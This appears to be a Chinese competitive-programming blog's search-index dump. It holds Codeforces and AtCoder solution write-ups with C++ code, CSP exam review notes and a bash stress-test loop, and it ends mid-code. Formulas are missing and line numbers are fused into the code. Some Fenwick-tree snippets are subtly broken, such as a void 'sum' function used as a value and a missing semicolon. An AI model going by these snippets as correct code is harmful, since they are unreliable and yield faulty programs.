solutionint main() { solution::work(); } 原理: 存在局部作用域时, 局部作用域中的声明优先被采用. 对拍 1234567891011121314g++ example.cpp -o exampleg++ example_std.cpp -o example_stdg++ example_dm.cpp -o example_dmwhile true; do ./example_dm ./example_std ./example if diff example.out example_std.out; then printf \"AC \" else printf \"WA \" exit 0 fidone 文件名保存为 example.sh, 在终端中用 bash example.sh 运行.","tags":["oi","linux"],"categories":["OI"]},{"title":"Codeforces 833B The bakery","path":"/2019/10/31/Codeforces-833B/","content":"http://codeforces.com/problemset/problem/833/Bhttp://codeforces.com/problemset/problem/833/B 题意 将一个长度为 的序列分为 段, 使得总价值最大, 一段区间的价值为区间内不同数字的个数. 分析 的区间DP以及各种瞎搞显然(然而考试时还是写爆了). 定义 表示前 i 个数分成 j 段的总价值, col表示一段区间内不同颜色数量, 容易得到 的 DP 方程: 只要在转移的时候搞掉一个 就可以过了. 分别考虑每一个点的贡献, 设 pre[i] 是这个位置上的点上次出现的位置, 那么它贡献的区间就是 (pre[i], i]. 所以我们在最外层枚举 , 每次用上一次的 DP 数组和区间的贡献值建一次线段树来为每一个 k 查询最大值, 将复杂度优化到 . 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;typedef long long int64;const int MAXN = 50010;const int INF = 0x3f3f3f3f;#include &lt;cctype&gt;#include &lt;cstdio&gt;inline int read() { int X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}int a[MAXN];int last[MAXN];int pre[MAXN];int dp[MAXN][52];namespace segtree {int maxv[MAXN &lt;&lt; 2], lazy[MAXN &lt;&lt; 2];void pushup(int rt) { maxv[rt] = max(maxv[rt &lt;&lt; 1], maxv[rt &lt;&lt; 1 | 1]); }void pushdown(int rt) { if (lazy[rt] != 0) { maxv[rt &lt;&lt; 1] += lazy[rt]; maxv[rt &lt;&lt; 1 | 1] += lazy[rt]; lazy[rt &lt;&lt; 1] += lazy[rt]; lazy[rt &lt;&lt; 1 | 1] += lazy[rt]; lazy[rt] = 0; }}void build(int k, int l, int r, int rt) { lazy[rt] = 0; if (l == r) { maxv[rt] = dp[l - 1][k]; return; } int mid = (l + r) &gt;&gt; 1; build(k, l, mid, rt &lt;&lt; 1); build(k, mid + 1, r, rt &lt;&lt; 1 | 1); pushup(rt);}void update(int L, int R, int val, int l, int r, int rt) { if (L &lt;= l &amp;&amp; r &lt;= R) { lazy[rt] += val; maxv[rt] += val; return; } pushdown(rt); int mid = (l + r) &gt;&gt; 1; if (L &lt;= mid) update(L, R, val, l, mid, rt &lt;&lt; 1); if (R &gt; mid) update(L, R, val, mid + 1, r, rt &lt;&lt; 1 | 1); pushup(rt);}int query(int L, int R, int l, int r, int rt) { if (L &lt;= l &amp;&amp; r &lt;= R) { return maxv[rt]; } pushdown(rt); int mid = (l + r) &gt;&gt; 1; int ans = 0; if (L &lt;= mid) ans = max(ans, query(L, R, l, mid, rt &lt;&lt; 1)); if (R &gt; mid) ans = max(ans, query(L, R, mid + 1, r, rt &lt;&lt; 1 | 1)); return ans;}}; // namespace segtreeint main() { int n = read(); int k = read(); for (int i = 1; i &lt;= n; i++) { a[i] = read(); pre[i] = last[a[i]]; last[a[i]] = i; } for (int j = 1; j &lt;= k; j++) { segtree::build(j - 1, 1, n, 1); for (int i = 1; i &lt;= n; i++) { segtree::update(pre[i] + 1, i, 1, 1, n, 1); dp[i][j] = segtree::query(1, i, 1, n, 1); } } cout &lt;&lt; dp[n][k] &lt;&lt; endl;}","tags":["题解","线段树"],"categories":["OI"]},{"title":"AT2300 Snuke Line","path":"/2019/10/30/AtCoder-2300/","content":"https://arc068.contest.atcoder.jp/tasks/arc068_chttps://arc068.contest.atcoder.jp/tasks/arc068_c 题意 有一趟列车有 个车站, 从 0 到 M 编号. 有 N 种商品, 第 i 种只在编号 的车站出售. 一辆列车有一个预设好的系数 d, 从 0 出发, 只会在 d 的倍数车站停车. 对于 d 从 1 到 M 的列车, 求最多能买到多少种商品. 分析 对于每一种商品, 假设他的覆盖的区间长度为 , 那么如果 , 则这种商品一定能买到; 否则最多只能在一个点被买到. 那么对于每一个 , 的情况直接将区间按长度排序后计数; 将所有 的区间的答案加一, 总答案就是 这些位置上的答案之和 (由于需要用树状数组统计的区间最多只会被一个点查询, 所以能做到不重不漏). 复杂度分析: 由于 , 树状数组的复杂度是 , 所以总复杂度是 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;using namespace std;const int MAXN = 3e5 + 10;const int MAXM = 3e5 + 10;template &lt;typename value_t&gt;class fenwick { public: fenwick(int n) { memset(c, 0, sizeof c); this-&gt;n = n; } void add(int i, value_t x) { while (i &lt;= n) { c[i] += x; i += Lowbit(i); } } value_t sum(int x) { value_t sum = 0; while (x &gt; 0) { sum += c[x]; x -= Lowbit(x); } return sum; } value_t sum(int x1, int x2) { return sum(x2) - sum(x1 - 1); } private: value_t c[MAXN]; int n; inline int Lowbit(int x) { return x &amp; (-x); }};struct interval { int l, r;} a[MAXM];struct comp { bool operator()(const interval&amp; a, const interval&amp; b) { return a.r - a.l &lt; b.r - b.l; }};#include &lt;cctype&gt;#include &lt;cstdio&gt;inline int read() { int X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}int main() { int n = read(); int m = read(); for (int i = 1; i &lt;= n; i++) { a[i].l = read(); a[i].r = read(); } sort(a + 1, a + n + 1, comp()); fenwick&lt;int&gt;* tree = new fenwick&lt;int&gt;(m); int cur = 1; for (int d = 1; d &lt;= m; d++) { while (cur &lt;= n &amp;&amp; a[cur].r - a[cur].l + 1 &lt; d) { tree-&gt;add(a[cur].l, 1); tree-&gt;add(a[cur].r + 1, -1); cur++; } int ans = n - cur + 1; for (int i = d; i &lt;= m; i += d) { ans += tree-&gt;sum(i); } cout &lt;&lt; ans &lt;&lt; endl; }}","tags":["题解","oi","树状数组"],"categories":["OI"]},{"title":"DFS 序和欧拉序复习","path":"/2019/10/29/DFS-Order/","content":"一道题 今天考试考了这么一道题: 出题人给出一颗以1为根的树, 一开始每个节点都是一颗棋子, 一面白一面黑, 白色的面朝上接下来就q次操作, 操作分两种: 0操作: 将一颗棋子翻转 1操作:询问一颗棋子与所有面朝上为黑色的棋子lca最深的那个的编号 空间 256M 时间 1.5s, 数据范围 8e5, 考场上果断写树剖, 可惜我人傻常数大, T到75分(有人用树剖过了). 题解是这么说的: image.png image.png 所以要复习一下. DFS 序 定义: 将树节点按dfs过程中的访问顺序排序，称为 DFS 序. 性质: 一个节点和它的子树在一个连续的区间中. 进入时间是 dfs 序的反函数, 即 dfs 序中的第i个点的进入时间是i. 欧拉序 树在 dfs 过程中的节点访问顺序称为欧拉序. 欧拉序有很多种, 只要整体满足 dfs 顺序即算欧拉序, 应当按实际需要选择适合的欧拉序. 欧拉序与dfs序不同地方在于, 欧拉序中每个节点可以出现多次, 比如进入一次退出一次, 又比如每次回溯时记录一次。 应用 灵活应用 DFS 序可以在避免树剖的情况下解决一些树上查询和修改问题. 点修改, 子树查询 由性质1, 一个节点和它的子树在一个连续的区间中. 所以这题可以转化为: 点修改, 区间查询. 用树状数组或线段树即可. 树链修改, 单点查询 将一条树链上的所有点的权值加, 可分为以下步骤: x 到根节点的链上所有节点权值加 v. y 到根节点的链上所有节点权值加 v. lca(x, y) 到根节点的链上所有节点权值减 v. fa[lca(x, y)] 到根节点的链上所有节点权值减 v. 即: 节点 x 到根节点链上所有节点的权值加减 v. 修改节点 u 权值, 当且仅当 u 是 v 的祖先节点时, u 对 v 的值有贡献. 所以节点u的权值根等于节点到u节点的链上所有节点和问题. 这就是点修改, 区间和查询问题. 修改操作: 1234update(l[x], v);update(l[y], v);update(l[lca(x, y)], -v);update(l[fa(lca(x, y))], -v) 查询操作: 1sum(r[x]) - sum(l[x] - 1) 树链修改, 子树和查询 修改操作和数组定义同上题. 考虑 u 的子节点 v 对 u 的贡献: 可得到 u 的子树和为: 因此需要两个树状数组或线段树来维护 和 的区间和. 单点更新, 树链和查询 相当于把第二种情况反过来, 所以将 定义为差分前缀和, 即的权值等于 dfs 中 的区间和. 修改操作: 12update(l[x], v);update(r[x] + 1, -v) 查询操作: 1sum(l[x]) + sum(l[y]) - sum(l[lca(x, y)]) - sum(l[fa(lca(x, y))]) 其他 子树修改, 单点查询: 区间修改, 单点查询. 子树修改, 子树和查询: 区间修改, 区间查询 子树修改, 树链查询: 定义 为根节点到y节点的链上所有节点和, 查询和修改操作类似可推.","tags":["oi","图论"],"categories":["OI"]},{"title":"CSP 初赛数据结构与算法复习","path":"/2019/10/17/CSP-Data-Structure-And-Algorithm/","content":"数制转换 K进制转10进制: 按权展开, 小数点左边第位的权为, 右边第位的权为. 10进制转K进制: 整数部分除K取余, 小数部分乘K取整. 栈 先进后出. image.png 进栈序列对应的出栈序列总数: Catalan 数 二叉树 image.png 先序遍历 根 左 右 2 7 1 6 5 3 8 9 4 中序遍历 左 根 右 1 7 5 6 3 2 8 4 9 后序遍历 左 右 根 1 5 3 6 7 4 9 8 2 已知中序遍历和另外两种之一可以唯一确定二叉树, 已知先序遍历和后序遍历不能唯一确定二叉树. 中缀表达式转换为前缀后缀表达式就是求表达式树的先序后序遍历的过程. n个点可以构造的不同二叉树种类数: Catalan 数 二叉树的数组表示法: 参考线段树的写法. 二叉树的性质 二叉树第层上至多有个节点. 深度为的二叉树至多有个节点, 至少有个节点. 二叉树中, 叶子节点个数为, 度为2的节点个数为, 则. 推广: K叉树中, 叶子节点个数为, 度为K的节点个数为, 则 完全二叉树和满二叉树 image.png 满二叉树: 深度为, 有个节点, 每一层都爆满. 完全二叉树: 除了最下层, 其他每层都饱满, 最下层的结点都集中在该层最左边的若干位置上. 满二叉树 完全二叉树 在满二叉树的最下层上, 从最右边开始连续删去若干结点后得到的二叉树仍然是一棵完全二叉树. 完全二叉树上, 若一个节点没有左孩子, 则他一定没有右孩子. 有个节点的完全二叉树深度为 哈夫曼树 原则: 变长编码, 前缀互不相同. 构造方法: 每次选数量最少的两个节点合并(合并果子). 哈夫曼树是带权路径长度最短的二叉树. 堆 image.png 堆总是一棵完全二叉树. 堆中某个节点的值总是不大于或不小于其父节点的值. STL中, 可以用以下函数维护一个位于数组上的堆. 1234make_heap(first, last, cmp);push_heap(first, last, cmp);pop_heap(first, last, cmp);sort_heap(first, last, cmp); 向堆中插入元素时, 先将新元素插入堆的尾部, 然后将新元素依次与他的父亲节点交换直到满足堆的性质; 删除堆顶元素时, 将堆顶和堆的最后一个元素交换, 移除堆尾, 然后将堆顶向下调整直到满足堆的性质. 排序算法 比较排序算法时间复杂度下限 算法 复杂度 额外空间 稳定性 说明 插入排序 否 是 原数据基本有序时较快 选择排序 否 否 选出最小的一个数与第一个的数交换; 在剩下的数再找最小的与第二个的数交换… 归并排序 是 可以用来求逆序对 冒泡排序 否 是 原数据基本有序时较快 希尔排序 否 否 把记录按下标的一定增量分组, 对每组使用直接插入排序算法排序; 随着增量逐渐减少, 每组包含的关键词越来越多; 原数据基本有序时较快 快速排序 否 否 不加随机化容易被卡 堆排序 $ 否 否 桶排序 是 基数排序 是 希尔排序图解: image.png 图论算法 最小生成树 Kruskal: 按边权排序, 每次取最小. Prim: 每个点出边按边权排序, 取链接不同连通块最小 最短路 Floyd Dijkstra SPFA 拓扑排序 计算机中数的表示 原码: 首位为符号位, 其余为真值. image.png 反码: 首位为符号位, 正数所有位和原码一样, 负数除了符号位和原码一样, 其他位相反. image.png 补码: 相反数等于取反加1, 0的表示只有一种, 加法自然溢出就能处理正负数. (CCF式)队列及循环队列 操作 队列 循环队列 入队 tail++ tail = (tail + 1) % (n + 1) 出队 head++ head = (head + 1) % (n + 1) 队满 head == (tail + 1) % (n + 1)","tags":["数据结构"],"categories":["OI"]},{"title":"CSP 初赛数学复习","path":"/2019/10/17/CSP-Review-Math/","content":"数学逻辑记号 与 或 非 C++ 运算符优先级: 排列组合 排列的定义: 从个不同元素中, 任取个元素, 按照一定的顺序排成一列, 叫做从个不同元素中取出个元素的一个排列. 组合的定义: 从n个不同元素中, 任取m个元素, 并成一组, 叫做从n个不同元素中取出m个元素的一个组合. 与顺序有关的用排列, 与顺序无关的用组合 加法原理, 乘法原理. 一些重要思想 学校师生合影，共8个学生，4个老师，要求老师在学生中间，且老师互不相邻，共有多少种不同的合影方式? 插入法: 对于要求某几个元素不相邻的问题, 可以考虑先排好其他的元素, 而对于不相邻的元素从其他元素排好后的的序列中枚举空位插入. 答案: 5个男生3个女生排成一排,3个女生要排在一起,有多少种不同的排法? 捆绑法: 要求相邻的元素可以视作一个元素参加排列, 注意捆绑的元素内部也能产生排列. 答案: 袋中有不同年份生产的5分硬币23个, 不同年份生产的1角硬币10个, 如果从袋中取出2元钱, 有多少种取法? 剩余法: 硬币共有2.15元, 取出两元即留下0.15元, 可以是或, 分别运用加法原理乘法原理得答案: 学校安排考试科目9门, 语文要在数学之前考, 有多少种不同的安排顺序? 对等法: “语文在数学之前”和”语文在数学之后”的情况是等价的, 所以答案就是 某个班级共有43位同学, 从中任抽5人, 正、副班长、团支部书记至少有一人在内的抽法有多少种? 排异法: 用总情况数减去三人都不选的情况, 避免分类讨论. 答案: 将8个相同的球放入3个不同盒子中, 每个盒子至少放一个, 有几种方法? 隔板法: 7个空位放2个板, 有中办法. 将8个相同的球放入3个不同盒子中, 盒子可以为空, 有几种方法? 隔板法: 两块板 + 8个球共10个元素, 方法数相当于从10个位置里选两个放板, 所以有种方法 推荐阅读 排列组合之“捆绑法”、“插空法”、“插板法” 隔板法和插空法的区别: 隔板法要求球相同 特殊的排列组合问题 圆排列: 从n个不同的元素中取r个沿一圆周排列. 有重复元素的排列: 分别有个不同的元素. 递推关系 错排问题 第i个元素不在i位置上的排列总数. 考虑两种情况: 先错排前个, 然后与前之一交换. 与前个之一交换, 再剩下个. 第一类 Stirling 数 n个不同元素构成m个圆排列的方案数. 考虑第n个元素: 单独组成一个圆排列 插到之前个数之一的左边 第二类 Stirling 数 将n个不同的元素拆分成m个集合的方案数. n个有区别的球放到m个相同的盒子中, 要求无一空盒, 其不同的方案数用表示，称为第二类 Stirling 数. 设有每个球分别为, 考虑放置 令独占一个新的盒子. 把放进现有的一个放了球的盒子里 注意隔板法是相同球进不同盒, 这里是不同球进相同盒. Catalan 数 推荐阅读: 卡特兰数 — 计数的映射方法的伟大胜利 令, Catalan 数满足: 一个足够大的栈的进栈序列对应的出栈序列的种数: 考虑最后出栈的是第i个元素, 所以比i先出栈有种方案, 比i后出栈有种方案, i取遍1到n就是上面的递推式. n个节点的二叉树种类数: 考虑中序遍历的序列, 树根为i, 则左子树的方案数为, 右子树的方案数为, 又得到了上面的递推式 凸多边形的三角形划分: 一个凸的n边形, 用直线连接他的两个顶点使之分成多个三角形, 每条直线不能相交, 问一共有多少种划分方案. 解法见图: image.png 的方格图中, 只能向右或向上, 从不跨越对角线的方法数. HDU 3398. 其他的一些也可以抽象为这个走格子的模型. 由n对括号形成的合法括号表达式数: 类比出栈序列. 用n个长方形去填充一个高度为n的阶梯图形的方法数: image.png 考虑包含最左上角的方块的矩形对应的是哪一个阶梯, 然后分为下边和右边两部分, 得到卡特兰数的递推公式. 集合取数问题 设是从集合中能够选择的没有两个连续整数的k个元素子集的数目, 求递归式. 考虑第n个数: 要放第n个数, 所以不能放第个数 不放第n个数 也可以用插空法模型来解决问题. 整数划分问题 将整数n分成k份, 且每份不能为空, 不考虑顺序互不相同的方法数. 令表示把n分为k份的方案数, 两种情况: 分出来的k份每一份都大于一, 所以先从n中取出k来摊在每一份上, 再分了剩下的. 分了一个1出来. 剩下的再说. 自然数n的拆分方案: 特征根法 数列满足递推关系式: 为得到其函数形式, 需将两边整理为类似的结构. 展开得 即是方程的两根. 经过化简可得到 其中可通过待定系数法解得. 不动点法 数列满足递推关系式: 令为方程的两根 若 则是以为公比的等比数列, 进一步可用待定系数法确定. 若 则是以为首项, 为公差的等差数列. 时间复杂度 NOIP2017 D1T2 P, NP, NPC, NP-Hard 推荐阅读: P问题、NP问题、NP完全问题和NP难问题 简称 英文 定义 例子 P问题 P: polynominal 存在多项式时间算法的问题 冒泡排序 NP问题 NP: Nondeterministic polynominal 能在多项式时间内验证一个正确解的问题 TSP NPC问题 NPC: Nondeterminism Polynomial Complete 存在这样一个NP问题, 所有的NP问题都可以约化成它. (只要解决了这个问题, 那么所有的NP问题都解决了) 逻辑电路问题(给定一个逻辑电路, 问是否存在一种输入使输出为False), Hamilton 回路, TSP NP 难问题 NP Hard 所有的NP问题都能约化到它, 但是他不一定是一个NP问题 并没有 我们感兴趣NP问题是否都是P问题(P == NP?)(如果是的, 那么所有NP问题都可以用计算机来解决了), 在研究这一点的过程中, 我们发现了一类特殊的NP问题, 解决它就可以解决所有的NP问题, 称之为NPC问题. 解决NP-Hard问题也可以解决NP问题, 但是NP-Hard问题不一定是NP问题. image.png P=NP至今仍未被证明或推翻, NPC问题的发现使得情况更加微妙了. Master 定理 推荐阅读: Master 定理学习笔记 记号 意义 等于 小于等于 小于 大于等于 大于 记不到就都当做一样的就是了 简单来说, 如果一个算法的时间复杂度能表示为一个如下所示的递推关系式: 那么的复杂度可以通过如下分类讨论得到: 则有 如的复杂度为. 则有 如的复杂度为. 存在一个非负整数使 如的复杂度为 简单来说就是和谁增长快听谁的, 两个一样加个.","tags":["数学"],"categories":["OI"]},{"title":"树状数组的奇妙运用","path":"/2019/10/7/Fenwick/","content":"树状数组是一种能够在线维护前缀和的数据结构, 其写法简单常数小… 不具体介绍了, 看看一些奇妙的操作吧. 人人都会的 单点修改, 区间查询: 基本维护前缀和 区间修改, 单点查询: 维护差分 区间修改, 区间查询 引入数组, 表示区间中需要加值的差分, 进行区间加法时, 就直接对操作, 对加上, 对减去. 查询前缀和时, 设为区间的元素和, 易得 发现我们需要维护, , 的前缀和. 代码可以这样写: 12345678910111213141516171819202122232425262728int suma[MAXN], sumd[MAXN], sumdi[MAXN];void update(int* c, int pos, int x) { while (pos &lt;= n) { c[pos] += x; pos += lowbit(pos); }}void sum(int* c, int pos) { int res = 0; while (pos &gt;= 1) { res += c[pos]; pos -= lowbit(pos); }}void add(int l, int r, int x) { update(sumd, l, x); update(sumd, r + 1, -x); update(sumdi, l, l * x); update(sumdi, r + 1, -(r + 1) * x);}int query(int l, int r) { return suma[r] + r * sum(sumd, r) + sum(sumdi, r) - (suma[l - 1] + (l - 1) * sum(sumd, l - 1) + sum(sumdi, l));} 二维前缀和 首先, 由二维前缀和求矩阵的操作方法: 用树状数组维护二维前缀和的方法: 1234567891011121314151617181920212223void update(int x, int y, int val) { while (x &lt;= n) { int t = y; while (t &lt;= m) { c[x][t] += val; t += lowbit(t); } x += lowbit(x); }}int query(int x, int y) { int res = 0; while (x &gt;= 1) { int t = y; while (t &gt;= 1) { res += c[x][t] t -= lowbit(t); } x -= lowbit(x); } return res;} 因此不难做到二维单点修改, 矩阵查询. 二维矩阵修改, 矩阵查询 首先说明一下二维差分怎么写. 由二维前缀和的形式, 定义 因此 即可用二维树状数组维护差分. 比如给一个的矩阵中间的部分加上, 可以这么修改差分数组: 123450 0 0 0 00 +x 0 0 -x0 0 0 0 00 0 0 0 00 -x 0 0 +x 所以矩阵修改操作的写法: 123456void add(int x1, int y1, int x2, int y2, int x) { update(x1, y1, x); update(x1, y2 + 1, -x); update(x2 + 1, y1, -x); update(x2 + 1, y2 + 1, x);} 为了实现二维区间修改和查询的操作, 我们可以类比一维的情况, 用差分来表示前缀和. 根据前面的套路, 我们统计每一个的出现次数, 可以展开两层: 也就是说, 我们需要维护 开四个树状数组即可. 这样用树状数组写, 常数会比线段树小一些.","tags":["oi","数据结构"],"categories":["OI"]},{"title":"CF360E Levko and Game","path":"/2019/10/5/Codeforces-360E/","content":"http://codeforces.com/problemset/problem/360/Ehttp://codeforces.com/problemset/problem/360/E 题意 个点, 条边的有向图, 其中给定条边可以在给定范围内任意修改边权, 判断并输出是否存在一种方案使的最短路比短. 分析 先令所有的边权都取到, 然后从开始单源最短路. 然后每次考虑一条边满足, 将他的边权设为后再跑最短路, 直到不存在这样的边, 然后判断结果并输出. 因为对于的情况, 假如在最短路上, 一定有, 所以现在修改了边权, 一定会使后面的更小, 即答案更优. 允许平局的情况, 改为即可. 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;queue&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 1e4 + 110;class lfs { public: lfs(int N) { memset(head, -1, sizeof head); memset(l, 0, sizeof l); memset(r, 0, sizeof r); ecnt = 0; n = N; } void adde(int from, int to, int L, int R) { u[ecnt] = from; l[ecnt] = L; r[ecnt] = R; e[ecnt].to = to; e[ecnt].w = R; e[ecnt].next = head[from]; head[from] = ecnt++; } struct Edge { int to, next, w; } e[MAXN * 2]; int head[MAXN]; int ecnt; int n; int u[MAXN], l[MAXN], r[MAXN];};class dijkstra : public lfs { public: dijkstra(int n) : lfs(n) {} int64 dis1[MAXN], dis2[MAXN]; void solve(int s, int64* dis) { priority_queue&lt;pair&lt;int64, int&gt;, vector&lt;pair&lt;int64, int&gt;&gt;, greater&lt;pair&lt;int64, int&gt;&gt;&gt; que; dis[s] = 0; que.push(pair&lt;int64, int&gt;(0, s)); while (!que.empty()) { pair&lt;int64, int&gt; p = que.top(); que.pop(); int v = p.second; if (dis[v] &lt; p.first) continue; for (int i = head[v]; ~i; i = e[i].next) { Edge now = e[i]; if (now.w + dis[v] &lt; dis[now.to]) { dis[now.to] = now.w + dis[v]; que.push(pair&lt;int64, int&gt;(dis[now.to], now.to)); } } } } bool check(int s1, int s2, int f, bool can_draw, int m, int k) { bool updated; do { updated = false; memset(dis1, INF, sizeof dis1); memset(dis2, INF, sizeof dis2); solve(s1, dis1); solve(s2, dis2); if (dis1[f] &lt; dis2[f] + can_draw) { cout &lt;&lt; (can_draw ? \"DRAW\" : \"WIN\") &lt;&lt; endl; for (int i = m; i &lt; m + k; i++) { cout &lt;&lt; e[i].w &lt;&lt; ' '; } cout &lt;&lt; endl; return true; } for (int i = m; i &lt; m + k; i++) { if (dis1[u[i]] &lt; dis2[u[i]] + can_draw) { if (e[i].w &gt; l[i]) { e[i].w = l[i]; updated = true; break; } } } } while (updated); return false; }};#include &lt;cctype&gt;#include &lt;cstdio&gt;template &lt;typename T = int&gt;inline T read() { T X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}int main() { int n, m, k; cin &gt;&gt; n &gt;&gt; m &gt;&gt; k; int s1, s2, f; cin &gt;&gt; s1 &gt;&gt; s2 &gt;&gt; f; dijkstra* graph = new dijkstra(n); for (int i = 1; i &lt;= m; i++) { int u = read(); int v = read(); int w = read(); graph-&gt;adde(u, v, w, w); } for (int i = 1; i &lt;= k; i++) { int u = read(); int v = read(); graph-&gt;l[i] = read(); graph-&gt;r[i] = read(); graph-&gt;adde(u, v, graph-&gt;l[i], graph-&gt;r[i]); } if (!graph-&gt;check(s1, s2, f, false, m, k)) { if (!graph-&gt;check(s1, s2, f, true, m, k)) { cout &lt;&lt; \"LOSE\" &lt;&lt; endl; } }}","tags":["题解","oi","贪心"],"categories":["OI"]},{"title":"CF273D Dima and Figure","path":"/2019/10/3/Codeforces-273D/","content":"http://codeforces.com/problemset/problem/273/Dhttp://codeforces.com/problemset/problem/273/D 题意 在的方格纸上选择一个四连块, 要求对于四连块中的任意两点之间的最小移动距离等于他们之间的曼哈顿距离. 问有多少种选法. 分析 条件的意思是选出的格子集是凸的, 即: 左边界先减后增, 右边界先增后减 可以定义, 表示考虑前行, 左边界为, 右边界为, 表示左边界是否可以减少, 表示右边界是否可以增加. 不难发现第一维可以滚动数组. 得到大量转移方程, 具体分类讨论见代码. 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 155;const int MOD = 1e9 + 7;int64 dp[MAXN][MAXN][2][2];int main() { int n, m; cin &gt;&gt; n &gt;&gt; m; for (int l = 1; l &lt;= m; l++) { for (int r = l; r &lt;= m; r++) { dp[l][r][1][1] = 1; } } int64 ans = 0; for (int i = 1; i &lt;= n; i++) { int64 sum = 0; for (int l = 1; l &lt;= m; l++) { for (int r = l; r &lt;= m; r++) { for (int sl = 0; sl &lt;= 1; sl++) { for (int sr = 0; sr &lt;= 1; sr++) { sum += dp[l][r][sl][sr]; sum %= MOD; } } } } ans += sum * (n - i + 1); // 统计的是上一行的答案 ans %= MOD; // 左侧收缩 for (int l = 1; l &lt; m; l++) { for (int r = l + 1; r &lt;= m; r++) { for (int sl = 0; sl &lt;= 1; sl++) { for (int sr = 0; sr &lt;= 1; sr++) { dp[l + 1][r][0][sr] += dp[l][r][sl][sr]; dp[l + 1][r][0][sr] %= MOD; } } } } // 右侧收缩 for (int l = m - 1; l &gt;= 1; l--) { for (int r = m; r &gt;= l + 1; r--) { for (int sl = 0; sl &lt;= 1; sl++) { for (int sr = 0; sr &lt;= 1; sr++) { dp[l][r - 1][sl][0] += dp[l][r][sl][sr]; dp[l][r - 1][sl][0] %= MOD; } } } } // 左侧扩张 for (int l = m; l &gt;= 2; l--) { for (int r = m; r &gt;= l; r--) { for (int sr = 0; sr &lt;= 1; sr++) { dp[l - 1][r][1][sr] += dp[l][r][1][sr]; dp[l - 1][r][1][sr] %= MOD; } } } // 右侧扩展 for (int l = 1; l &lt; m; l++) { for (int r = l; r &lt; m; r++) { for (int sl = 0; sl &lt;= 1; sl++) { dp[l][r + 1][sl][1] += dp[l][r][sl][1]; dp[l][r + 1][sl][1] %= MOD; } } } } cout &lt;&lt; ans &lt;&lt; endl;}","tags":["题解","oi","dp"],"categories":["OI"]},{"title":"CF1209E Rotate Columns","path":"/2019/10/3/Codeforces-1209E/","content":"http://codeforces.com/problemset/problem/1209/E2http://codeforces.com/problemset/problem/1209/E2 这是一道最近 Codeforces 比赛的题目, 当时在场上昏昏欲睡, 连小的点都没有想出来, 现在再看一下. 题意 给你一个的矩阵, 可以对每一列的元素循环移位, 求每一行的最大值之和的最大值. . 分析 明示状压. 考虑定义状态表示考虑前列, 其中包括的行已经取了最大值的答案, 那么每次就可以枚举的子集来转移, 复杂度, 可以水过小数据. 观察分析发现, 答案至少取到每列按照最大值排序的前个值, 因此枚举状压的部分可以降到, 加上按最大值取前列复杂度是, 大数据可过. 代码 可以用以下方法取的子集(每次去掉最后一个二进制1): 1234for (int k = s; ; k = (k - 1) &amp; s) { ... if (k == 0) break;} 用以下方法取的超集: 123for (int k = s; k &lt; (1 &lt;&lt; n); k = (k + 1) | s) { ...} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 14;const int MAXS = (1 &lt;&lt; 12) + 10;const int MAXM = 2010;int a[MAXN][MAXM];int mxval[MAXM];int dp[MAXN][MAXS];int col[MAXM];#include &lt;cctype&gt;#include &lt;cstdio&gt;template &lt;typename T = int&gt;inline T read() { T X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}int val[MAXS]; // 预处理每次循环移位的结果int main() { int tcnt = read(); for (int T = 1; T &lt;= tcnt; T++) { int n = read(); int m = read(); memset(a, 0, sizeof a); memset(col, 0, sizeof col); memset(mxval, 0, sizeof mxval); memset(dp, 0, sizeof dp); for (int i = 0; i &lt; n; i++) { for (int j = 1; j &lt;= m; j++) { a[i][j] = read(); mxval[j] = max(mxval[j], a[i][j]); } } for (int i = 1; i &lt;= m; i++) { col[i] = i; } sort(col + 1, col + m + 1, [](const int&amp; a, const int&amp; b) -&gt; bool { return mxval[a] &gt; mxval[b]; }); for (int i = 1; i &lt;= min(n, m); i++) { memset(val, 0, sizeof val); for (int s = 0; s &lt; (1 &lt;&lt; n); s++) { for (int j = 0; j &lt; n; j++) { // 暴力循环移位 int now = 0; for (int k = 0; k &lt; n; k++) { if (s &amp; (1 &lt;&lt; k)) { now += a[(j + k) % n][col[i]]; } } val[s] = 